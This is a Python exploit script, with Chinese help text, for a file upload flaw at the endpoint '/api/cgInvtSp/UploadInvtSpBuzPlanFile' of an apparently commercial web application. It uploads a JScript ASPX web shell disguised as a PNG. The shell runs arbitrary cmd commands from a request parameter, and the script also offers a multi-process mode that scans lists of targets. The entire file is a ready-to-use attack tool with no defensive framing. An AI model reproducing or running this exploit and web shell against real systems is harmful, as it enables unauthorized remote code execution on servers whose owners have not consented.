import requests
from multiprocessing import Pool
import warnings
import argparse
import re
from lxml import etree
proxy="http://127.0.0.1:7890"

warnings.filterwarnings("ignore")
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36',
        'Connection': 'keep-alive',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7yyQ5XLHOn6WZ6MT'
    }


def main():
    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", "--url",dest="target", help="url检测")
    argparser.add_argument("-f", "--file",dest="file",help="批量检测")
    argparser.add_argument("-exp", "--exp",dest="exp",help="一键getshell")
    argparser.add_argument("-p", "--payload",dest="payload",help="shell内容")
    arg=argparser.parse_args()
    payload='<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>'
    target = arg.target
    file = arg.file
    targets = []
    #if arg.exp :
    if target:
        #print(target)
        if arg.exp:
            if arg.payload:
                payload = arg.payload
                check(target)
                getshell(target,payload)
            else:
                getshell(target,payload)

        else:
            check(target)

    elif file:
        try:
            with open(file, "r", encoding="utf-8") as f:
                target = f.readlines()
                for target in target:
                    if "http" in target:
                        target = target.strip()
                        targets.append(target)
                    else:
                        target = "http://" + target
                        targets.append(target)
        except Exception as e:
            print("[文件错误！]")
        pool = Pool(processes=30)
        pool.map(check, targets)
def check(target):
    #print(target)
    data = """------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png

<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
        """
    try:
        url=f"{target}/api/cgInvtSp/UploadInvtSpBuzPlanFile"
        response = requests.post(url,headers=headers,data=data, timeout=6,verify=False)
        if response.status_code == 200 and "1.aspx" in response.text:
           print(f"[*]{target}存在漏洞")
        else:
            print(f"[!]{target}不存在漏洞")
    except Exception as e:
        pass

def getshell(target,payload):
    #print(target,payload)
    data = f"""------WebKitFormBoundary7yyQ5XLHOn6WZ6MT
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/png

{payload}
------WebKitFormBoundary7yyQ5XLHOn6WZ6MT--
            """
    #print(data)
    try:
        url=f"{target}/api/cgInvtSp/UploadInvtSpBuzPlanFile"
        response = requests.post(url,headers=headers,data=data, timeout=6,verify=False)
        #print(response.text)
        if response.status_code == 200 and "1.aspx" in response.text:
            text = response.text
            match = re.findall(r'"filepath":"([^"]+)"', text)
            #print(match)
            for match in match:
                print(f"[*]文件地址{target}{match}")
        else:
            print(f"[!]{target}不存在漏洞")
    except Exception as e:
        pass
if __name__ == '__main__':
    main()